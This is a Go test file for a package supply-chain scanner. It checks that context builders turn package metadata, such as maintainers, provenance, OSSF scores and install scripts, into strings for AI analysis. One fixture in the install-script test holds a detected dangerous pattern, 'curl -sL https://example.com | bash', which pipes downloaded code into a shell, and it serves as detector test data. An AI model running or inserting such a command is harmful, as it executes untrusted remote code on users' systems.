package ai

import (
	"strings"
	"testing"
	"time"

	"github.com/metalstormbass/snyft/pkg/models"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// Test: CheckAnalyzer context builder functions produce meaningful context strings
// Justification: Each scoring category receives AI analysis with category-specific context.
//                The context builders extract the most relevant metadata fields for each
//                category — missing or incorrect context leads to poor AI assessments.
// Source: Per-category AI analysis design (PR #82)
// Methodology: Build context strings with representative PackageMetadata and verify
//              that each builder includes the fields most relevant to its category.
// Result: Each context string should contain category-specific metadata fields

func TestCheckAnalyzer_BuildPublisherControlContext(t *testing.T) {
	ca := &CheckAnalyzer{}
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			Maintainers:          []string{"alice", "bob"},
			DownloadCount:        1000000,
			RepoOwner:            "org-name",
			SignedReleases:       true,
			HasSLSAAttestation:   true,
			HasSigstoreSignature: false,
			HasNPMProvenance:     true,
			RepoCreatedAt:       time.Now().AddDate(-2, 0, 0),
			OSSFScore:            7.5,
		},
	}

	ctx := ca.buildPublisherControlContext("express", models.EcosystemNPM, result)

	assert.Contains(t, ctx, "express")
	assert.Contains(t, ctx, "npm")
	assert.Contains(t, ctx, "Maintainer count: 2")
	assert.Contains(t, ctx, "alice, bob")
	assert.Contains(t, ctx, "Download count: 1000000")
	assert.Contains(t, ctx, "org-name")
	assert.Contains(t, ctx, "Signed releases: true")
	assert.Contains(t, ctx, "Has SLSA attestation: true")
	assert.Contains(t, ctx, "Has npm provenance: true")
	assert.Contains(t, ctx, "OSSF Scorecard score: 7.5/10")
}

func TestCheckAnalyzer_BuildOwnershipChangesContext(t *testing.T) {
	ca := &CheckAnalyzer{}
	now := time.Now()
	result := &models.AnalysisResult{
		SourceCodeAvailable: true,
		Metadata: models.PackageMetadata{
			Maintainers:      []string{"new-owner"},
			PublishedAt:      now.AddDate(-3, 0, 0),
			RepoCreatedAt:    now.AddDate(0, -1, 0), // Created much later than published
			BusFactor:        1,
			TopContributorPct: 95.0,
			RepoLastCommit:   now.AddDate(0, 0, -7),
		},
	}

	ctx := ca.buildOwnershipChangesContext("suspicious-pkg", models.EcosystemNPM, result)

	assert.Contains(t, ctx, "suspicious-pkg")
	assert.Contains(t, ctx, "Current maintainers: 1")
	assert.Contains(t, ctx, "AFTER package first published")
	assert.Contains(t, ctx, "Current bus factor: 1")
	assert.Contains(t, ctx, "Top contributor: 95%")
	assert.Contains(t, ctx, "Source code available: true")
}

func TestCheckAnalyzer_BuildReleaseAnomaliesContext(t *testing.T) {
	ca := &CheckAnalyzer{}
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			PublishedAt:       time.Now().AddDate(-5, 0, 0),
			RepoLastCommit:    time.Now().AddDate(0, -6, 0),
			LatestVersion:     "3.2.1",
			RepoStars:         5000,
			RepoForks:         800,
			RepoOpenIssues:    42,
			BusFactor:         2,
			TopContributorPct: 70.0,
			DownloadCount:     500000,
		},
	}

	ctx := ca.buildReleaseAnomaliesContext("lodash", models.EcosystemNPM, result)

	assert.Contains(t, ctx, "lodash")
	assert.Contains(t, ctx, "Latest version: 3.2.1")
	assert.Contains(t, ctx, "Stars: 5000")
	assert.Contains(t, ctx, "Open issues: 42")
	assert.Contains(t, ctx, "Current bus factor: 2")
	assert.Contains(t, ctx, "Download count: 500000")
}

func TestCheckAnalyzer_BuildInstallExecutionContext(t *testing.T) {
	ca := &CheckAnalyzer{}
	result := &models.AnalysisResult{
		SourceCodeAvailable: true,
		Metadata: models.PackageMetadata{
			HasInstallScripts: true,
			InstallScripts: map[string]string{
				"postinstall": "node scripts/setup.js",
				"preinstall":  "echo hello",
			},
			InstallScriptAnalysis: &models.InstallScriptAnalysis{
				HasDangerousPatterns: true,
				RiskLevel:            "HIGH",
				DangerousPatterns: []models.DangerousPattern{
					{
						Severity:    "HIGH",
						Pattern:     "network_download",
						Description: "Script downloads external code",
						Match:       "curl -sL https://example.com | bash",
					},
				},
			},
			HasCI:         true,
			DownloadCount: 100000,
		},
	}

	ctx := ca.buildInstallExecutionContext("risky-pkg", models.EcosystemNPM, result)

	assert.Contains(t, ctx, "risky-pkg")
	assert.Contains(t, ctx, "Has install scripts: true")
	assert.Contains(t, ctx, "Install script count: 2")
	assert.Contains(t, ctx, "postinstall")
	assert.Contains(t, ctx, "node scripts/setup.js")
	assert.Contains(t, ctx, "Rule-based analysis detected dangerous patterns: true")
	assert.Contains(t, ctx, "Rule-based risk level: HIGH")
	assert.Contains(t, ctx, "network_download")
	assert.Contains(t, ctx, "curl -sL https://example.com | bash")
}

func TestCheckAnalyzer_BuildDependencySprawlContext(t *testing.T) {
	ca := &CheckAnalyzer{}
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			DependencyMetrics: &models.DependencyMetrics{
				DirectCount:     15,
				TransitiveCount: 230,
				MaxDepth:        7,
				Verified:        true,
			},
			License:       "MIT",
			DownloadCount: 2000000,
			OSSFChecks: map[string]int{
				"Dependency-Update-Tool": 8,
				"Pinned-Dependencies":    6,
			},
		},
	}

	ctx := ca.buildDependencySprawlContext("express", models.EcosystemNPM, result)

	assert.Contains(t, ctx, "express")
	assert.Contains(t, ctx, "Direct dependencies: 15")
	assert.Contains(t, ctx, "Transitive dependencies: 230")
	assert.Contains(t, ctx, "Maximum dependency depth: 7")
	assert.Contains(t, ctx, "Dependency count verified from lock file: true")
	assert.Contains(t, ctx, "License: MIT")
	assert.Contains(t, ctx, "OSSF Dependency-Update-Tool score: 8/10")
	assert.Contains(t, ctx, "OSSF Pinned-Dependencies score: 6/10")
}

func TestCheckAnalyzer_BuildProvenanceContext(t *testing.T) {
	ca := &CheckAnalyzer{}
	result := &models.AnalysisResult{
		SourceCodeAvailable: true,
		SourceVerification: &models.SourceVerification{
			HasMatchingGitTag: true,
			HasSourcePackage:  true,
		},
		Metadata: models.PackageMetadata{
			HasSLSAAttestation:   true,
			SLSALevel:            "3",
			HasSigstoreSignature: true,
			HasNPMProvenance:     true,
			SignedReleases:       true,
			ReproducibleBuild:    true,
			ProvenanceDetails:    "GitHub Actions workflow",
			CISystems:            []string{"GitHub Actions"},
			HasReleaseProcess:    true,
			OSSFChecks: map[string]int{
				"Signed-Releases": 9,
			},
		},
	}

	ctx := ca.buildProvenanceContext("secure-pkg", models.EcosystemNPM, result)

	assert.Contains(t, ctx, "secure-pkg")
	assert.Contains(t, ctx, "Has SLSA attestation: true")
	assert.Contains(t, ctx, "SLSA level: 3")
	assert.Contains(t, ctx, "Has Sigstore signature: true")
	assert.Contains(t, ctx, "Has npm provenance attestation: true")
	assert.Contains(t, ctx, "Has signed GitHub releases: true")
	assert.Contains(t, ctx, "Reproducible build configured: true")
	assert.Contains(t, ctx, "GitHub Actions workflow")
	assert.Contains(t, ctx, "Has matching git tag: true")
	assert.Contains(t, ctx, "OSSF Signed-Releases score: 9/10")
}

func TestCheckAnalyzer_BuildProvenanceContext_PyPI(t *testing.T) {
	ca := &CheckAnalyzer{}
	result := &models.AnalysisResult{
		SourceCodeAvailable: true,
		Metadata: models.PackageMetadata{
			HasPyPISignatures: true,
		},
	}

	ctx := ca.buildProvenanceContext("requests", models.EcosystemPyPI, result)

	assert.Contains(t, ctx, "Has PyPI cryptographic signatures: true")
	// Should NOT contain npm-specific fields
	assert.NotContains(t, ctx, "npm provenance")
}

func TestCheckAnalyzer_BuildHealthContext(t *testing.T) {
	ca := &CheckAnalyzer{}
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			BusFactor:           3,
			TopContributorPct:   45.0,
			CommitDistribution:  map[string]int{"alice": 100, "bob": 80, "charlie": 50},
			Maintainers:         []string{"alice", "bob", "charlie"},
			CodeReviewRate:      85.0,
			HasBranchProtection: true,
			RequiredReviewers:   2,
			CIQualityScore:      8,
			CIHasTests:          true,
			CISystems:           []string{"GitHub Actions", "CircleCI"},
			RepoStars:           10000,
			RepoForks:           2000,
			RepoOpenIssues:      50,
			RepoLastCommit:      time.Now().AddDate(0, 0, -3),
			OSSFChecks: map[string]int{
				"Code-Review":       9,
				"Branch-Protection": 8,
			},
		},
	}

	ctx := ca.buildHealthContext("popular-pkg", models.EcosystemNPM, result)

	assert.Contains(t, ctx, "Bus factor: 3")
	assert.Contains(t, ctx, "Top contributor concentration: 45%")
	assert.Contains(t, ctx, "Total distinct commit authors: 3")
	assert.Contains(t, ctx, "Maintainer count: 3")
	assert.Contains(t, ctx, "Code review rate: 85%")
	assert.Contains(t, ctx, "Branch protection enabled: true")
	assert.Contains(t, ctx, "Required reviewers: 2")
	assert.Contains(t, ctx, "CI quality score: 8/10")
	assert.Contains(t, ctx, "CI includes tests: true")
	assert.Contains(t, ctx, "Stars: 10000")
	assert.Contains(t, ctx, "OSSF Code-Review score: 9/10")
}

func TestCheckAnalyzer_BuildGovernanceContext(t *testing.T) {
	ca := &CheckAnalyzer{}
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			RepoArchived:   false,
			RepoLastCommit: time.Now().AddDate(0, 0, -14),
			RepoUpdatedAt:  time.Now().AddDate(0, 0, -7),
			RepoOpenIssues: 25,
			License:        "Apache-2.0",
			Maintainers:    []string{"org-team"},
			RepoOwner:      "apache",
			OSSFChecks: map[string]int{
				"Security-Policy": 10,
				"Maintained":      9,
			},
			OSSFScore: 8.5,
		},
	}

	ctx := ca.buildGovernanceContext("well-governed", models.EcosystemMaven, result)

	assert.Contains(t, ctx, "well-governed")
	assert.Contains(t, ctx, "Repository archived: false")
	assert.Contains(t, ctx, "License: Apache-2.0")
	assert.Contains(t, ctx, "Repository owner: apache")
	assert.Contains(t, ctx, "OSSF Security-Policy score: 10/10")
	assert.Contains(t, ctx, "OSSF Maintained score: 9/10")
	assert.Contains(t, ctx, "Overall OSSF score: 8.5/10")
}

func TestCheckAnalyzer_BuildGovernanceContext_NoLicense(t *testing.T) {
	ca := &CheckAnalyzer{}
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			License: "", // No license
		},
	}

	ctx := ca.buildGovernanceContext("informal-pkg", models.EcosystemNPM, result)

	assert.Contains(t, ctx, "License: none (informal project)")
}

func TestCheckAnalyzer_BuildReleaseSecurityContext(t *testing.T) {
	ca := &CheckAnalyzer{}
	result := &models.AnalysisResult{
		SourceCodeAvailable: true,
		SourceVerification: &models.SourceVerification{
			HasMatchingGitTag: true,
		},
		Metadata: models.PackageMetadata{
			BuildSystems: []models.BuildSystemInfo{
				{
					Platform:      "GitHub Actions",
					HostedBy:      "GitHub",
					IsSelfHosted:  false,
					RunnerDetails: "ubuntu-latest",
					ConfigFile:    ".github/workflows/release.yml",
				},
			},
			HasSelfHosted:       false,
			HasReleaseProcess:   true,
			HasBranchProtection: true,
			RequiredReviewers:   1,
			SignedReleases:      true,
			HasSLSAAttestation:  true,
			OSSFChecks: map[string]int{
				"CI-Tests":          9,
				"Branch-Protection": 7,
			},
		},
	}

	ctx := ca.buildReleaseSecurityContext("safe-pkg", models.EcosystemNPM, result)

	assert.Contains(t, ctx, "safe-pkg")
	assert.Contains(t, ctx, "GitHub Actions")
	assert.Contains(t, ctx, "ubuntu-latest")
	assert.Contains(t, ctx, ".github/workflows/release.yml")
	assert.Contains(t, ctx, "Has self-hosted runners: false")
	assert.Contains(t, ctx, "Has automated release process: true")
	assert.Contains(t, ctx, "Branch protection enabled: true")
	assert.Contains(t, ctx, "Has matching git tag for release: true")
	assert.Contains(t, ctx, "OSSF CI-Tests score: 9/10")
}

func TestCheckAnalyzer_BuildReleaseSecurityContext_NoBuildSystems(t *testing.T) {
	ca := &CheckAnalyzer{}
	result := &models.AnalysisResult{
		SourceCodeAvailable: true,
		Metadata: models.PackageMetadata{
			// No BuildSystems or CISystems
		},
	}

	ctx := ca.buildReleaseSecurityContext("manual-pkg", models.EcosystemNPM, result)

	assert.Contains(t, ctx, "none detected (possible manual publishing)")
}

func TestCheckAnalyzer_BuildPackageMaturityContext(t *testing.T) {
	ca := &CheckAnalyzer{}
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			PublishedAt:    time.Now().AddDate(-5, 0, 0),
			RepoLastCommit: time.Now().AddDate(0, 0, -30),
			RepoUpdatedAt:  time.Now().AddDate(0, 0, -15),
			LatestVersion:  "4.18.2",
			RepoStars:      62000,
			RepoForks:      10000,
			DownloadCount:  25000000,
			RepoOpenIssues: 150,
			RepoArchived:   false,
			Maintainers:    []string{"a", "b", "c"},
			BusFactor:      5,
			OSSFChecks: map[string]int{
				"Maintained": 10,
			},
		},
	}

	ctx := ca.buildPackageMaturityContext("express", models.EcosystemNPM, result)

	assert.Contains(t, ctx, "express")
	assert.Contains(t, ctx, "Latest version: 4.18.2")
	assert.Contains(t, ctx, "Stars: 62000")
	assert.Contains(t, ctx, "Download count: 25000000")
	assert.Contains(t, ctx, "Repository archived: false")
	assert.Contains(t, ctx, "Maintainer count: 3")
	assert.Contains(t, ctx, "Bus factor: 5")
	assert.Contains(t, ctx, "OSSF Maintained score: 10/10")
}

// Test: NewCheckAnalyzer creates a valid analyzer
// Justification: Constructor should correctly store client reference
// Source: Go constructor conventions
// Methodology: Create analyzer with a client, verify non-nil
// Result: Should return a non-nil CheckAnalyzer
func TestNewCheckAnalyzer(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	require.NoError(t, err)
	defer client.Close()

	ca := NewCheckAnalyzer(client)
	assert.NotNil(t, ca)
	assert.Equal(t, client, ca.client)
}

// Test: AnalyzeAllCategories with nil SupplyChainScore returns early
// Justification: Graceful handling when supply chain score is not yet computed
// Source: Defensive programming - AI analysis should not fail on missing prerequisites
// Methodology: Call AnalyzeAllCategories with nil SupplyChainScore
// Result: Should return without panic or error
func TestCheckAnalyzer_AnalyzeAllCategories_NilScore(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	require.NoError(t, err)
	defer client.Close()

	ca := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		SupplyChainScore: nil, // No score yet
	}

	// Should not panic
	assert.NotPanics(t, func() {
		ca.AnalyzeAllCategories(nil, "test-pkg", models.EcosystemNPM, result)
	})
}

// Test: Context builders handle minimal/empty metadata gracefully
// Justification: Some packages may have very sparse metadata (e.g., no repository,
//                no download counts). Builders must not panic on zero values.
// Source: Defensive programming for varied package ecosystems
// Methodology: Call each builder with empty metadata
// Result: Each should return a non-empty string without panicking
func TestCheckAnalyzer_ContextBuilders_EmptyMetadata(t *testing.T) {
	ca := &CheckAnalyzer{}
	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{},
	}

	builders := []struct {
		name string
		fn   func(string, models.Ecosystem, *models.AnalysisResult) string
	}{
		{"PublisherControl", ca.buildPublisherControlContext},
		{"OwnershipChanges", ca.buildOwnershipChangesContext},
		{"ReleaseAnomalies", ca.buildReleaseAnomaliesContext},
		{"InstallExecution", ca.buildInstallExecutionContext},
		{"DependencySprawl", ca.buildDependencySprawlContext},
		{"Provenance", ca.buildProvenanceContext},
		{"Health", ca.buildHealthContext},
		{"Governance", ca.buildGovernanceContext},
		{"ReleaseSecurity", ca.buildReleaseSecurityContext},
		{"PackageMaturity", ca.buildPackageMaturityContext},
	}

	for _, b := range builders {
		t.Run(b.name, func(t *testing.T) {
			ctx := b.fn("test-pkg", models.EcosystemNPM, result)
			assert.NotEmpty(t, ctx, "%s should return non-empty context", b.name)
			assert.True(t, strings.Contains(ctx, "test-pkg"), "%s should contain package name", b.name)
		})
	}
}
